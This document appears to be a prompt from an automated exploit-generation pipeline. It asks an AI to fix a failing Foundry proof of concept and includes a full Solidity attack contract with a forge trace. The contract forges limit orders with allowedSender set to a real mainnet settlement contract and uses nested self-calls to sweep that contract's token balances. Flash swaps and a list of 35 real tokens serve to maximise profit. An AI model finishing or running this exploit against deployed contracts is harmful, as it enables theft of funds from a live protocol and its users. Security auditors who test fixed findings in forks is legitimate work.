You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: Self-targeted settlement interactions allow reentrancy that satisfies `allowedSender = SETTLEMENT`
- claim: The replay chain repeatedly targets `SETTLEMENT` from within settlement interactions while every forged replay order sets `allowedSender` to `SETTLEMENT`. This only succeeds if settlement can call back into itself and the nested call observes `msg.sender == SETTLEMENT`, allowing externally initiated execution of orders that were intended to be invokable only by the settlement contract itself.
- impact: Arbitrary users can trigger private or restricted orders by wrapping them inside self-calls, bypassing `allowedSender` protections and enabling theft of victim funds or other unauthorized fills.
- exploit_paths: ["`executeOnOpportunity()` -> `_tryReplayCalldataCorruption()` -> `interaction5` targets `SETTLEMENT`", "outer `settleOrders` -> nested self-call into settlement -> replay orders with `allowedSender = SETTLEMENT` execute"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWETH is IERC20 {
    function deposit() external payable;
}

interface ISettlement {
    function settleOrders(bytes calldata data) external;
}

interface IOrderMixinLike {
    struct Order {
        uint256 salt;
        address makerAsset;
        address takerAsset;
        address maker;
        address receiver;
        address allowedSender;
        uint256 makingAmount;
        uint256 takingAmount;
        uint256 offsets;
        bytes interactions;
    }
}

interface IUniswapV2RouterLike {
    function factory() external pure returns (address);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address private constant SETTLEMENT = 0xA88800CD213dA5Ae406ce248380802BD53b47647;
    address private constant LIMIT_ORDER_PROTOCOL = 0x1111111254EEB25477B68fb85Ed929f73A960582;
    address private constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address private constant ONE_INCH = 0x111111111117dC0aa78b770fA6A738034120C302;
    address private constant UNI = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984;
    address private constant LINK = 0x514910771AF9Ca656af840dff83E8264EcF986CA;
    address private constant AAVE = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9;
    address private constant LDO = 0x5A98FcBEA516Cf06857215779Fd812CA3beF1B32;

    bytes4 private constant ERC1271_MAGIC = 0x1626ba7e;
    uint256 private constant MAKING_AMOUNT = 1;
    uint256 private constant SEED_WETH = 2;
    uint256 private constant MAX_TARGETS = 35;

    address private _profitToken;
    uint256 private _profitAmount;
    bool private _executed;
    bool private _coreRan;

    constructor() {}

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;

        _prepareMakerCapital();

        if (_safeBalanceOf(WETH, address(this)) < SEED_WETH) {
            if (_bootstrapSeedWeth()) {
                return;
            }
        }

        _runExploitPath();
    }

    function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata data) external {
        address pair = abi.decode(data, (address));
        require(msg.sender == pair, "pair");

        uint256 borrowed = amount0 > 0 ? amount0 : amount1;

        _prepareMakerCapital();
        _runExploitPath();

        uint256 repayAmount = ((borrowed * 1000) / 997) + 1;
        require(_safeTransfer(WETH, pair, repayAmount), "repay");
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function isValidSignature(bytes32, bytes calldata) external pure returns (bytes4) {
        return ERC1271_MAGIC;
    }

    function _runExploitPath() internal {
        if (_coreRan) {
            return;
        }
        _coreRan = true;

        address[] memory targets = _targetTokens();
        for (uint256 i = 0; i < MAX_TARGETS; ++i) {
            address targetToken = targets[i];
            if (_safeBalanceOf(targetToken, SETTLEMENT) == 0) {
                continue;
            }

            _tryReplayCalldataCorruption(targetToken, 0x1000 + i);
            _maybeRealizeWeth(targetToken);
            _registerProfit(WETH);
            _registerProfit(targetToken);
        }

        _finalizeProfit(targets);
    }

    function _prepareMakerCapital() internal {
        if (_safeBalanceOf(WETH, address(this)) < SEED_WETH && address(this).balance >= SEED_WETH) {
            IWETH(WETH).deposit{value: SEED_WETH}();
        }

        _forceApprove(WETH, LIMIT_ORDER_PROTOCOL, type(uint256).max);
        _forceApprove(USDT, UNISWAP_V2_ROUTER, type(uint256).max);
        _forceApprove(USDC, UNISWAP_V2_ROUTER, type(uint256).max);
        _forceApprove(DAI, UNISWAP_V2_ROUTER, type(uint256).max);
    }

    function _bootstrapSeedWeth() internal returns (bool) {
        address pair = IUniswapV2FactoryLike(IUniswapV2RouterLike(UNISWAP_V2_ROUTER).factory()).getPair(WETH, USDC);
        if (pair == address(0)) {
            return false;
        }

        bool wethIsToken0 = IUniswapV2PairLike(pair).token0() == WETH;
        uint256 amount0Out = wethIsToken0 ? SEED_WETH : 0;
        uint256 amount1Out = wethIsToken0 ? 0 : SEED_WETH;

        try IUniswapV2PairLike(pair).swap(amount0Out, amount1Out, address(this), abi.encode(pair)) {
            return true;
        } catch {
            return false;
        }
    }

    function _tryReplayCalldataCorruption(address targetToken, uint256 uniq) internal {
        uint256 settlementBalance = _safeBalanceOf(targetToken, SETTLEMENT);
        if (settlementBalance == 0) {
            return;
        }

        bytes memory nestedInteraction = _encodeTokenSweep(targetToken, settlementBalance);
        bytes memory nestedSettleData = _encodeSettlementCall(_buildReplayOrder(uniq), nestedInteraction);
        bytes memory interaction5 = _encodeExternalCall(SETTLEMENT, nestedSettleData);

        try ISettlement(SETTLEMENT).settleOrders(_encodeSettlementCall(_buildWrapperOrder(uniq + 1), interaction5)) {}
        catch {}
    }

    function _buildReplayOrder(uint256 salt) internal view returns (IOrderMixinLike.Order memory order) {
        order = IOrderMixinLike.Order({
            salt: salt,
            makerAsset: WETH,
            takerAsset: WETH,
            maker: address(this),
            receiver: address(this),
            allowedSender: SETTLEMENT,
            makingAmount: MAKING_AMOUNT,
            takingAmount: MAKING_AMOUNT,
            offsets: 0,
            interactions: bytes("")
        });
    }

    function _buildWrapperOrder(uint256 salt) internal view returns (IOrderMixinLike.Order memory order) {
        order = IOrderMixinLike.Order({
            salt: salt,
            makerAsset: WETH,
            takerAsset: WETH,
            maker: address(this),
            receiver: address(this),
            allowedSender: address(0),
            makingAmount: MAKING_AMOUNT,
            takingAmount: MAKING_AMOUNT,
            offsets: 0,
            interactions: hex"0000000000"
        });
    }

    function _encodeSettlementCall(IOrderMixinLike.Order memory order, bytes memory interaction)
        internal
        pure
        returns (bytes memory)
    {
        return abi.encode(order, bytes(""), interaction, uint256(0), order.takingAmount, uint256(0), SETTLEMENT);
    }

    function _encodeExternalCall(address target, bytes memory data) internal pure returns (bytes memory) {
        return abi.encodePacked(target, bytes1(0x00), data);
    }

    function _encodeTokenSweep(address token, uint256 amount) internal view returns (bytes memory) {
        return _encodeExternalCall(token, abi.encodeWithSelector(IERC20.transfer.selector, address(this), amount));
    }

    function _maybeRealizeWeth(address token) internal {
        if (token != USDT && token != USDC && token != DAI) {
            return;
        }

        uint256 amountIn = _safeBalanceOf(token, address(this));
        if (amountIn == 0) {
            return;
        }

        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = WETH;

        try IUniswapV2RouterLike(UNISWAP_V2_ROUTER).swapExactTokensForTokens(
            amountIn, 0, path, address(this), block.timestamp
        ) {} catch {}
    }

    function _registerProfit(address token) internal returns (bool) {
        uint256 balance = _safeBalanceOf(token, address(this));
        if (balance <= _profitAmount) {
            return false;
        }

        _profitToken = token;
        _profitAmount = balance;
        return true;
    }

    function _finalizeProfit(address[] memory targets) internal {
        _registerProfit(WETH);
        for (uint256 i = 0; i < MAX_TARGETS; ++i) {
            _registerProfit(targets[i]);
        }
    }

    function _targetTokens() internal pure returns (address[] memory tokens) {
        tokens = new address[](MAX_TARGETS);
        tokens[0] = UNI;
        tokens[1] = WETH;
        tokens[2] = DAI;
        tokens[3] = USDC;
        tokens[4] = USDT;
        tokens[5] = ONE_INCH;
        tokens[6] = WBTC;
        tokens[7] = LINK;
        tokens[8] = AAVE;
        tokens[9] = LDO;
        tokens[10] = 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2;
        tokens[11] = 0xD533a949740bb3306d119CC777fa900bA034cd52;
        tokens[12] = 0x4e3FBD56CD56c3e72c1403e103b45Db9da5B9D2B;
        tokens[13] = 0xc00e94Cb662C3520282E6f5717214004A7f26888;
        tokens[14] = 0xba100000625a3754423978a60c9317c58a424e3D;
        tokens[15] = 0xC011A72400E58ecD99Ee497CF89E3775d4bd732F;
        tokens[16] = 0x853d955aCEf822Db058eb8505911ED77F175b99e;
        tokens[17] = 0x3432B6A60D23Ca0dFCa7761B7ab56459D9C964D0;
        tokens[18] = 0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE;
        tokens[19] = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
        tokens[20] = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
        tokens[21] = 0xae78736Cd615f374D3085123A210448E74Fc6393;
        tokens[22] = 0xBe9895146f7AF43049ca1c1AE358B0541Ea49704;
        tokens[23] = 0xCd5fE23C85820F7B72D0926FC9b05b43E359b7ee;
        tokens[24] = 0x4c9EDD5852cd905f086C759E8383e09bff1E68B3;
        tokens[25] = 0x9D39A5DE30e57443BfF2A8307A4256c8797A3497;
        tokens[26] = 0x0000000000085d4780B73119b644AE5ecd22b376;
        tokens[27] = 0x5f98805A4E8be255a32880FDeC7F6728C6568bA0;
        tokens[28] = 0x57Ab1ec28D129707052df4dF418D58a2D46d5f51;
        tokens[29] = 0x6c3ea9036406852006290770BEdFcAbA0e23A0e8;
        tokens[30] = 0x45804880De22913dAFE09f4980848ECE6EcbAf78;
        tokens[31] = 0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0;
        tokens[32] = 0x57e114B691Db790C35207b2e685D4A43181e6061;
        tokens[33] = 0x808507121B80c02388fAd14726482e061B8da827;
        tokens[34] = 0x6982508145454Ce325dDbE47a25d4ec3d2311933;
    }

    function _safeTransfer(address token, address to, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20.transfer.selector, to, amount));
        return ok && (data.length == 0 || abi.decode(data, (bool)));
    }

    function _safeBalanceOf(address token, address account) internal view returns (uint256) {
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20.balanceOf.selector, account));
        if (!ok || data.length < 32) {
            return 0;
        }
        return abi.decode(data, (uint256));
    }

    function _forceApprove(address token, address spender, uint256 amount) internal returns (bool) {
        (bool ok0, bytes memory data0) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, uint256(0)));
        if (!ok0 || (data0.length > 0 && !abi.decode(data0, (bool)))) {
            return false;
        }

        (bool ok1, bytes memory data1) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, amount));
        return ok1 && (data1.length == 0 || abi.decode(data1, (bool)));
    }

    receive() external payable {}
    fallback() external payable {}
}

```

forge stdout (tail):
```
  │   └─ ← [Return] 0
    │   ├─ [534] 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [486] 0xae78736Cd615f374D3085123A210448E74Fc6393::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [1226] 0xBe9895146f7AF43049ca1c1AE358B0541Ea49704::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [529] 0x31724cA0C982A31fbb5C57f4217AB585271fc9a5::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [969] 0xCd5fE23C85820F7B72D0926FC9b05b43E359b7ee::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [583] 0xe629ee84C1Bd9Ea9c677d2D5391919fCf5E7d5D9::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [580] 0x4c9EDD5852cd905f086C759E8383e09bff1E68B3::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2569] 0x9D39A5DE30e57443BfF2A8307A4256c8797A3497::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [3187] 0x0000000000085d4780B73119b644AE5ecd22b376::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [2488] 0xDBC97a631C2Fee80417D5D69F32B198c8c39c27e::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [487] 0x5f98805A4E8be255a32880FDeC7F6728C6568bA0::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [4455] 0x57Ab1ec28D129707052df4dF418D58a2D46d5f51::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [3431] 0x10A5F7D9D65bCc2734763444D4940a31b109275f::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   │   │   ├─ [2497] 0x05a9CBe762B36632b3594DA4F082340E0e5343e8::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [1471] 0x6c3ea9036406852006290770BEdFcAbA0e23A0e8::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [692] 0x7302eA4E51B041b691D1F3458fA7D36560f90708::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [3769] 0x45804880De22913dAFE09f4980848ECE6EcbAf78::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [2990] 0x74271F2282eD7eE35c166122A60c9830354be42a::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [2631] 0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [577] 0x57e114B691Db790C35207b2e685D4A43181e6061::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [610] 0x808507121B80c02388fAd14726482e061B8da827::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [624] 0x6982508145454Ce325dDbE47a25d4ec3d2311933::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [345] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 2
    ├─ [341] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 2
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 1000000000000000000000000 [1e24])
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 999999999999999999999998 [9.999e23])
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 2)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 2)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 21982110 [2.198e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 3124)
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0xA88800CD213dA5Ae406ce248380802BD53b47647
  at 0x1111111254EEB25477B68fb85Ed929f73A960582
  at 0xA88800CD213dA5Ae406ce248380802BD53b47647.settleOrders
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 3.05s (2.96s CPU time)

Ran 1 test suite in 3.09s (3.05s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 2087293)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
